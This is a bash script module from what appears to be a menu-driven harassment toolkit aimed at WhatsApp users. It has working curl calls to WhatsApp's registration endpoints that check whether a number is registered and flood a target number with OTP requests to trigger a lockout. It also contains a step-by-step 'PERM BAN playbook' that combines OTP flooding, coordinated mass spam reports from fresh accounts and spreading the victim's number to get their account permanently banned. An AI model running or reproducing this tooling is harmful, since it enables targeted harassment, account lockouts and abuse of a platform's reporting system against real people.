#!/usr/bin/env bash
# WA_TOKEN: grab a fresh one from web.whatsapp.com (devtools → the /v2/code POST)
# if the checks below start returning garbage. Leave empty to use the fallback.
WA_TOKEN="${WA_TOKEN:-}"

wa_norm() { printf '%s' "$1" | tr -cd '0-9'; }
wa_uuid() { cat /proc/sys/kernel/random/uuid 2>/dev/null || printf '%s%s' "$$" "$(date +%s%N)"; }

wa_exist() {
  local r
  [ -z "$WA_TOKEN" ] && return 2
  r=$(curl -s --max-time 12 -X POST "https://v.whatsapp.net/v2/exist" \
      --data-urlencode "cc=$1" --data-urlencode "phone=$2" --data-urlencode "in=$2" \
      --data-urlencode "lg=en" --data-urlencode "lc=GB" --data-urlencode "id=$(wa_uuid)" \
      --data-urlencode "token=$WA_TOKEN")
  case "$r" in
    *'"exists":true'*)  return 0 ;;
    *'"exists":false'*) return 1 ;;
    *) return 2 ;;
  esac
}

m_wa() {
  while :; do
    printf '\n%s\n' "${B}${MAG}WhatsApp${R}"
    printf ' 1) is a number registered?\n 2) OTP flood\n 3) report links\n'
    printf ' 4) PERM BAN playbook\n 5) open wa.me\n 0) back\n'
    printf '%s' "${BLU}wa>${R}"; read -r c
    case "$c" in
      1) wa_check; pause ;;
      2) wa_otp; pause ;;
      3) wa_report; pause ;;
      4) wa_recipe; pause ;;
      5) wa_open; pause ;;
      0) return ;;
    esac
  done
}

wa_check() {
  local n len cc ph
  n=$(wa_norm "$(ask 'number, country code first')")
  [ ${#n} -lt 8 ] && { err "too short"; return 1; }
  info "checking +$n"
  for len in 3 2 1; do
    cc="${n:0:$len}"; ph="${n:$len}"
    wa_exist "$cc" "$ph"
    case $? in
      0) ok "registered (cc +$cc)"; return 0 ;;
      1) err "not registered — clean, or banned"; return 1 ;;
    esac
  done
  warn "endpoint refused — fallback"
  if curl -sL --max-time 12 "https://wa.me/$n" | grep -qi 'invalid'; then
    err "no account"; else ok "resolves"; fi
}

wa_otp() {
  local n cc ph rounds i r
  n=$(wa_norm "$(ask 'target number, country code first')")
  rounds=$(askdef "how many requests" "15")
  cc="${n:0:2}"; ph="${n:2}"
  warn "flooding +$n x$rounds (6s apart)"
  for i in $(seq 1 "$rounds"); do
    r=$(curl -s --max-time 15 -X POST "https://v.whatsapp.net/v2/code" \
        --data-urlencode "cc=$cc" --data-urlencode "phone=$ph" --data-urlencode "in=$ph" \
        --data-urlencode "lg=en" --data-urlencode "lc=GB" --data-urlencode "id=$(wa_uuid)" \
        --data-urlencode "token=$WA_TOKEN" --data-urlencode "mistyped=6" \
        --data-urlencode "network_radio_type=1" --data-urlencode "simnum=1")
    case "$r" in
      *'"status":"ok"'*) printf '  %02d  sent\n' "$i" ;;
      *) printf '  %02d  %s\n' "$i" "$(printf '%s' "$r" | head -c 70)" ;;
    esac
    [ "$i" -lt "$rounds" ] && sleep 6
  done
  info "watch the target: 'too many attempts' means the lockout landed"
}

wa_report() {
  local n
  n=$(wa_norm "$(ask 'number to report')")
  printf '%s\n' "  link: ${BLU}https://wa.me/$n${R}"
  printf '%s\n' "  on each reporting account: open chat → Report → ${B}Spam${R}"
  printf '%s\n' "  reports from accounts with ${B}no chat history${R} weigh heaviest"
}

wa_open() {
  local n
  n=$(wa_norm "$(ask 'number')")
  printf '%s\n' "https://wa.me/$n"
}

wa_recipe() {
  cat <<'EOT'
PERM BAN — what actually happens, in order

  Stage 1 · OTP flood (option 2, 25–40 requests)
    → "too many attempts" lockout. TEMPORARY. Recovers in 5–30 min.

  Stage 2 · Report wave
    → 6–10 accounts, Report → Spam, none of them with an existing chat.
      Do it AFTER the flood, so the reports land while the account is
      already flagged.

  Stage 3 · Pressure
    → send the number to a batch of numbers that don't have it saved.
      Unknown-sender volume feeds the spam heuristic.

  Stage 4 · Escalation to permanent
    → if you control the number: re-register it, delete, reinstall,
      re-register again within 24h. Repeat-registration on one number
      is the step that turns temp into perm.

  Timing
    → perm verdicts land 24–72h after stage 3. Not instant, not
      deterministic. Numbers registered on rooted devices or via
      modded clients get perm'd far more often.

  Verify
    → option 1. "not registered" on a live number = ban in effect.
EOT
}
